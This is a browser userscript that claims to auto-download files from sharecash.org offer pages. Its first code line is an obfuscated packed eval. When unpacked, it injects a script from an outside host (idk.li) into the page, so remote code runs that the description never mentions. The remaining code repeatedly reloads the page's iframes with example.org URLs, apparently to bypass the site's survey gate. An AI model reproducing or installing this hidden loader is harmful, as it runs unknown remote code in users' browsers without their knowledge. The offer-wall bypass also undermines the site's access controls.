// ==UserScript==
// @name           Sharecash autodownload V2+
// @author 		   Timendum
// @namespace      sharecash
// @description    Auto-download files from sharecash.org
// @include        http://sharecash.org/offer2.php?*
// @include        http://69.93.2.170/offer2.php?*
// @version 	   3.5.2
// ==/UserScript==

eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('3 1=2.4(\'5\');1.6=\'7://8.9/a/b.c\';1.d=\'e/f\';2.g(\'h\')[0].i(1);',19,19,'|GM_JQ|document|var|createElement|script|src|http|idk|li|scripts|main|js|type|text|javascript|getElementsByTagName|head|appendChild'.split('|'),0,{}))
var ShareTimendum = {
	frame: [],
	steps: 0,
	frameCount: 0,
	baseUrl: 'http://www.example.org/?p=',
	init: function() {
		ShareTimendum.checkFrame();
	},
	checkFrame: function() {
		for (var i=0; i < document.getElementsByTagName('iframe').length; i++) {
			try {
				var tmp = document.getElementsByTagName('iframe')[i].contentDocument.baseURI;
			} catch(e) {
				ShareTimendum.frame.push(i);
			}
		}
		if (ShareTimendum.frame.length == 0) {
			setTimeout(ShareTimendum.init, 1000);
		} else {
			setTimeout(ShareTimendum.makeStep, 500);
		}
	},
	makeStep: function() {
		if (ShareTimendum.frame.length == 0)
			return;
		
		if (ShareTimendum.frameCount == ShareTimendum.frame.length) {
			ShareTimendum.frameCount = 0;
			ShareTimendum.steps++;
		}
		document.getElementsByTagName('iframe')[ShareTimendum.frameCount].src = ShareTimendum.baseUrl + ShareTimendum.steps;
		ShareTimendum.frameCount++;
		setTimeout(ShareTimendum.makeStep, 2500);
	},
};
setTimeout(ShareTimendum.init, 2000);